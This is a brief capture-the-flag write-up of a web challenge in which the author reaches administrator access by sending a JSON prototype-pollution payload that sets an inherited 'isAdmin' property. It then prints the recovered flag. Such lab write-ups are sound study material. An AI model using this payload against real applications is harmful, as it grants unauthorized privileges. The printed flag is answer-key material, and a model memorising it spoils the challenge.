![alt text](image.png)

![alt text](image-1.png)

So in this web challange i had to login as the administrator to find the flag. Wtaht drew my attentio was this code 

![alt text](image-2.png)


With the power of insering a JSON i could gain access
![alt text](image-3.png)

The payload that worked was:
{
    "options": {
        "constructor": {
            "prototype": {
                "isAdmin": true
            }
        }
    }
}

 Proof of success came later when a subsequent file upload resulted in a JSON response where all objects had inherited the "isAdmin": true property.

 ![alt text](image-4.png)
 Now I had the admin mode activated and claimed the flag

 ![alt text](image-5.png)
 ctf{fa82311c2970593b2df929b7d0f1ca6292a9a2d3707057b84a5127ceed38edd6}


 

